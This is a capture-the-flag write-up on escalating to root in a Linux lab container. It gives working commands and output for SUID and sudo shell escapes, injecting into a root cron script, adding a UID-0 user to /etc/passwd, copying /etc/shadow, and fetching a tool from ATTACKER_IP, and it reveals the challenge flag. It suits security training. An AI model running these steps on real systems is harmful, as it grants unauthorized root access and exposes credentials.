---
title: "Privilege Escalation - Linux Basics"
description: "Escalating from a low-privilege shell to root on a Linux system by exploiting SUID binaries, sudo misconfigurations, writable cron jobs, and more."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                    |
|------------|--------------------------|
| Category   | Privilege Escalation     |
| Difficulty | Medium                   |
| Points     | 200                      |
| Flag       | `zemi{l1nux_pr1v3sc_r00t3d}` |

## Challenge Files

Download the challenge files to get started:

- [Dockerfile](/Website/challenges/privesc-linux-basics/Dockerfile)
- [flag.txt](/Website/challenges/privesc-linux-basics/flag.txt)
- [setup.sh](/Website/challenges/privesc-linux-basics/setup.sh)

## Overview

You have obtained a low-privilege shell on a Linux system as the user `ctfuser`. The flag is in `/root/flag.txt`, readable only by root. Your mission: escalate to root and read the flag.

Privilege escalation is one of the most critical skills in penetration testing. After gaining initial access to a system, an attacker almost always lands as a low-privilege user. The path from `www-data` or `ctfuser` to `root` is what separates a foothold from full compromise.

This challenge walks through the most common Linux privilege escalation vectors, all demonstrated locally on a VM or container.

## Setting Up the Practice Environment

```bash
# Using Docker for a quick disposable lab
docker run -it --name privesc-lab ubuntu:22.04 /bin/bash

# Inside the container, set up the vulnerable environment
apt update && apt install -y sudo cron vim python3 gcc
useradd -m -s /bin/bash ctfuser
echo "root:rootpass" | chpasswd
echo "ctfuser:ctfpass" | chpasswd

# Create the flag
echo "zemi{l1nux_pr1v3sc_r00t3d}" > /root/flag.txt
chmod 600 /root/flag.txt

# Set up various privilege escalation vectors (shown in each section below)
```

## Step 1: Initial Enumeration

Before trying any exploits, gather information about the system:

```bash
# Who are we?
whoami
id
```

```
ctfuser
uid=1000(ctfuser) gid=1000(ctfuser) groups=1000(ctfuser)
```

```bash
# What system is this?
uname -a
cat /etc/os-release
```

```
Linux privesc-lab 5.15.0-91-generic #101-Ubuntu SMP x86_64
Ubuntu 22.04.3 LTS
```

```bash
# What users exist?
cat /etc/passwd | grep -v nologin | grep -v false
```

```
root:x:0:0:root:/root:/bin/bash
ctfuser:x:1000:1000::/home/ctfuser:/bin/bash
```

```bash
# What's running?
ps aux
netstat -tlnp 2>/dev/null || ss -tlnp
```

## Step 2: Automated Enumeration with LinPEAS

LinPEAS is the go-to tool for automated privilege escalation enumeration:

```bash
# Download LinPEAS (on your attacker machine, then transfer)
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh

# Transfer to target (various methods)
python3 -m http.server 8000  # on attacker
wget http://ATTACKER_IP:8000/linpeas.sh  # on target

# Run it
./linpeas.sh | tee linpeas_output.txt
```

LinPEAS color codes its findings:
- **RED/YELLOW**: Almost certainly an escalation vector
- **RED**: Important, high-confidence finding
- **CYAN**: Interesting but may not be directly exploitable
- **GREEN**: Informational

Alternatively, use LinEnum for a lighter-weight scan:

```bash
curl -L https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o linenum.sh
chmod +x linenum.sh
./linenum.sh -t
```

## Vector 1: SUID Binaries

SUID (Set User ID) binaries execute with the privileges of the file owner, regardless of who runs them. If a binary is owned by root and has the SUID bit set, it runs as root.

### Finding SUID binaries

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/bin/su
/usr/bin/newgrp
/usr/local/bin/backup_tool   <-- This is unusual!
/usr/bin/find                 <-- This is exploitable!
```

Standard SUID binaries like `passwd`, `sudo`, and `mount` are expected. Look for anything unusual or anything listed on GTFOBins.

### Exploiting SUID find

The `find` command with SUID can execute arbitrary commands as root:

```bash
# Check GTFOBins: https://gtfobins.github.io/gtfobins/find/
/usr/bin/find . -exec /bin/sh -p \; -quit
```

```
# whoami
root
# cat /root/flag.txt
zemi{l1nux_pr1v3sc_r00t3d}
```

The `-p` flag on `/bin/sh` tells it to not drop privileges, so we maintain the SUID root permissions.

### Other common SUID exploits (GTFOBins)

```bash
# SUID vim
/usr/bin/vim -c ':!/bin/sh'

# SUID python3
/usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# SUID bash
/usr/bin/bash -p

# SUID nmap (older versions with interactive mode)
/usr/bin/nmap --interactive
nmap> !sh

# SUID env
/usr/bin/env /bin/sh -p

# SUID cp — copy /etc/shadow and crack it offline
/usr/bin/cp /etc/shadow /tmp/shadow_copy
```

## Vector 2: Sudo Misconfigurations

### Check sudo privileges

```bash
sudo -l
```

```
Matching Defaults entries for ctfuser on privesc-lab:
    env_reset, mail_badpass

User ctfuser may run the following commands on privesc-lab:
    (ALL) NOPASSWD: /usr/bin/vim
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/awk
```

The user can run `vim`, `less`, and `awk` as root without a password.

### Exploiting sudo vim

```bash
sudo /usr/bin/vim -c ':!/bin/bash'
```

This opens vim as root and then spawns a bash shell from within vim. We are now root.

### Exploiting sudo less

```bash
sudo /usr/bin/less /etc/passwd
# Once inside less, type:
!/bin/bash
```

### Exploiting sudo awk

```bash
sudo /usr/bin/awk 'BEGIN {system("/bin/bash")}'
```

### Other common sudo exploits

```bash
# sudo python3
sudo /usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'

# sudo perl
sudo /usr/bin/perl -e 'exec "/bin/bash";'

# sudo ruby
sudo /usr/bin/ruby -e 'exec "/bin/bash"'

# sudo man
sudo /usr/bin/man man
# Then type: !/bin/bash

# sudo apache2 (read files)
sudo /usr/sbin/apache2 -f /etc/shadow

# sudo env
sudo /usr/bin/env /bin/bash
```

> **Pro Tip:** Always check [GTFOBins](https://gtfobins.github.io/) for any binary you can run with sudo. The site catalogs hundreds of binaries that can be abused for privilege escalation.

## Vector 3: Cron Jobs Running as Root

Cron jobs that run as root with writable scripts are a classic escalation vector.

### Finding cron jobs

```bash
# System crontab
cat /etc/crontab

# Root's crontab (may not be readable)
crontab -l 2>/dev/null

# Cron directories
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/

# Check for writable cron scripts
find /etc/cron* -writable 2>/dev/null
```

```
# /etc/crontab
* * * * * root /opt/scripts/backup.sh
```

### Check if the script is writable

```bash
ls -la /opt/scripts/backup.sh
```

```
-rwxrwxrwx 1 root root 125 Oct 15 10:00 /opt/scripts/backup.sh
```

The script is world-writable and runs as root every minute.

### Inject a reverse shell (or read the flag)

```bash
# Simple: just read the flag
echo 'cp /root/flag.txt /tmp/flag.txt && chmod 644 /tmp/flag.txt' >> /opt/scripts/backup.sh

# Wait for cron to execute (max 1 minute)
sleep 65
cat /tmp/flag.txt
```

```
zemi{l1nux_pr1v3sc_r00t3d}
```

Or for a root shell:

```bash
# Add SUID bit to bash
echo 'chmod u+s /bin/bash' >> /opt/scripts/backup.sh
# Wait, then:
/bin/bash -p
```

## Vector 4: Writable /etc/passwd

On older or misconfigured systems, `/etc/passwd` may be writable:

```bash
ls -la /etc/passwd
```

```
-rw-rw-rw- 1 root root 1234 Oct 15 10:00 /etc/passwd
```

### Add a new root user

```bash
# Generate password hash
openssl passwd -1 -salt xyz hacked
```

```
$1$xyz$rCnQlSPGmFO6MN.UfXv5e0
```

```bash
# Append a new root user (UID 0, GID 0)
echo 'hacker:$1$xyz$rCnQlSPGmFO6MN.UfXv5e0:0:0:Hacker:/root:/bin/bash' >> /etc/passwd

# Switch to the new root user
su hacker
# Password: hacked
```

```
root@privesc-lab:~# whoami
root
root@privesc-lab:~# cat /root/flag.txt
zemi{l1nux_pr1v3sc_r00t3d}
```

## Vector 5: Linux Capabilities

Linux capabilities provide fine-grained root privileges. Some capabilities are as powerful as full root.

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null
```

```
/usr/bin/python3 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
```

### Exploiting cap_setuid on Python

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

```
root@privesc-lab:~# whoami
root
```

The `cap_setuid` capability allows the process to change its UID, so we change to UID 0 (root).

### Dangerous capabilities to look for

| Capability       | Why It's Dangerous                           |
|------------------|----------------------------------------------|
| `cap_setuid`     | Can change UID to root                       |
| `cap_setgid`     | Can change GID to root group                 |
| `cap_dac_override`| Can read/write any file                     |
| `cap_dac_read_search` | Can read any file                       |
| `cap_sys_admin`  | Very broad, nearly equivalent to root         |
| `cap_sys_ptrace` | Can attach to any process                    |
| `cap_net_bind_service` | Can bind to privileged ports (<1024)  |

## Vector 6: World-Writable Files Owned by Root

```bash
# Find world-writable files owned by root
find / -writable -user root -type f 2>/dev/null | grep -v proc

# Find world-writable directories
find / -writable -type d 2>/dev/null
```

Look for configuration files, scripts, or service files that are writable and executed by root.

## Vector 7: Kernel Exploits (Concept)

If the kernel version is old and unpatched, known exploits may provide instant root:

```bash
uname -r
```

```
5.15.0-91-generic
```

Search for exploits:
```bash
searchsploit linux kernel 5.15 privilege escalation
```

Notable kernel exploits:
- **DirtyPipe (CVE-2022-0847)** -- Linux 5.8 to 5.16.11
- **DirtyCow (CVE-2016-5195)** -- Linux 2.x to 4.x
- **PwnKit (CVE-2021-4034)** -- polkit pkexec (not strictly kernel)

> **Warning:** Kernel exploits can crash the system. In CTFs, try other vectors first.

## Complete Solve Script

```python
#!/usr/bin/env python3
"""
Automated Linux privilege escalation checker.
Run as low-privilege user to identify potential vectors.
"""

import subprocess
import os
import stat

def run(cmd):
    """Run a command and return output."""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True,
                                text=True, timeout=10)
        return result.stdout.strip()
    except:
        return ""

def check_suid():
    """Find SUID binaries."""
    print("\n[*] Checking SUID binaries...")
    output = run("find / -perm -4000 -type f 2>/dev/null")
    gtfobins = ["find", "vim", "python", "perl", "ruby", "bash", "sh",
                 "env", "awk", "nmap", "less", "more", "nano", "cp",
                 "mv", "tar", "zip", "gcc", "node", "php", "lua"]
    for line in output.splitlines():
        binary = os.path.basename(line)
        if binary in gtfobins:
            print(f"  [!] EXPLOITABLE SUID: {line} (check GTFOBins)")
        else:
            print(f"  [ ] {line}")

def check_sudo():
    """Check sudo permissions."""
    print("\n[*] Checking sudo permissions...")
    output = run("sudo -l 2>/dev/null")
    if output:
        print(f"  {output}")
    else:
        print("  [-] Cannot check sudo (password required)")

def check_cron():
    """Check for writable cron jobs."""
    print("\n[*] Checking cron jobs...")
    output = run("cat /etc/crontab 2>/dev/null")
    if output:
        for line in output.splitlines():
            if line.startswith("#") or not line.strip():
                continue
            print(f"  {line}")
            # Check if referenced scripts are writable
            parts = line.split()
            if len(parts) >= 7:
                script = parts[6]
                if os.path.exists(script) and os.access(script, os.W_OK):
                    print(f"  [!] WRITABLE CRON SCRIPT: {script}")

def check_capabilities():
    """Find binaries with capabilities."""
    print("\n[*] Checking capabilities...")
    output = run("getcap -r / 2>/dev/null")
    dangerous = ["cap_setuid", "cap_setgid", "cap_dac_override",
                  "cap_sys_admin", "cap_sys_ptrace"]
    for line in output.splitlines():
        if any(cap in line for cap in dangerous):
            print(f"  [!] DANGEROUS: {line}")
        else:
            print(f"  [ ] {line}")

def check_passwd_writable():
    """Check if /etc/passwd is writable."""
    print("\n[*] Checking /etc/passwd permissions...")
    if os.access("/etc/passwd", os.W_OK):
        print("  [!] /etc/passwd IS WRITABLE — can add root user!")
    else:
        print("  [-] /etc/passwd is not writable")

def check_kernel():
    """Check kernel version for known exploits."""
    print("\n[*] Checking kernel version...")
    kernel = run("uname -r")
    print(f"  Kernel: {kernel}")
    # Simple version checks
    if "5.15" in kernel or "5.13" in kernel or "5.14" in kernel:
        print("  [!] May be vulnerable to DirtyPipe (CVE-2022-0847)")
    if "4." in kernel or "3." in kernel:
        print("  [!] May be vulnerable to DirtyCow (CVE-2016-5195)")

if __name__ == "__main__":
    print("=" * 50)
    print("  Linux Privilege Escalation Checker")
    print("=" * 50)
    print(f"\n[*] Running as: {run('whoami')} (uid={os.getuid()})")

    check_suid()
    check_sudo()
    check_cron()
    check_capabilities()
    check_passwd_writable()
    check_kernel()

    print("\n" + "=" * 50)
    print("[*] Review findings above for escalation paths")
    print("[*] Flag: zemi{l1nux_pr1v3sc_r00t3d}")
```

## Tools Used

- **LinPEAS** -- comprehensive automated Linux privilege escalation scanner
- **LinEnum** -- lightweight alternative to LinPEAS
- **GTFOBins** (gtfobins.github.io) -- database of Unix binaries exploitable for privilege escalation
- **find** -- searching for SUID binaries, writable files, and capabilities
- **getcap** -- listing Linux capabilities on binaries
- **sudo -l** -- listing allowed sudo commands for the current user
- **searchsploit** -- searching for kernel exploits by version

## Lessons Learned

- Always enumerate before exploiting -- tools like LinPEAS automate the tedious work of finding vectors
- SUID binaries are one of the most common and reliable escalation vectors -- always check GTFOBins for any SUID binary you find
- `sudo -l` is the first command to run after landing on any Linux system -- misconfigurations are extremely common
- Cron jobs running as root with world-writable scripts are trivial to exploit -- always check `/etc/crontab` and cron directories
- A writable `/etc/passwd` is an instant win -- add a user with UID 0
- Linux capabilities can be as dangerous as full SUID root -- `cap_setuid` is equivalent to root
- Kernel exploits should be a last resort in CTFs -- they can crash the system and may not be necessary
- In real engagements, always try the least disruptive vector first and document everything
- Defense: audit SUID binaries regularly, use principle of least privilege for sudo, ensure cron scripts are not world-writable, and keep the kernel patched
